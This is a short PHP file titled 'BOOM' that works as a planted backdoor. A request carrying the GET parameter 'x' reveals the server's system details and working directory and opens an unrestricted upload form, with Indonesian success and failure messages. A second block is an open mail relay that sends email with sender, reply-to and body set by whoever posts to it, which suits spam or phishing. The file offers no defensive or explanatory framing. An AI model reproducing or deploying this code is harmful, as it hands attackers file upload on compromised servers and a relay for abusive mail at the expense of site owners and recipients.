<?php

if(isset($_GET["x"])){echo"<font color=#000000>[uname]".php_uname()."[/uname]";echo"<br><font color=#000000>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}

if(isset($_POST['subject'])) {
    $headers = "From: {$_POST['sender']} <{$_POST['from']}>\r\nReply-To: {$_POST['reply']}\r\nDate: " . date("r") . "\r\n";
    if($_POST['html'] == 'True')
        $headers .= "MIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n";
    mail($_POST['email'], $_POST['subject'], $_POST['content'], $headers);
}

?>
<title>BOOM</title>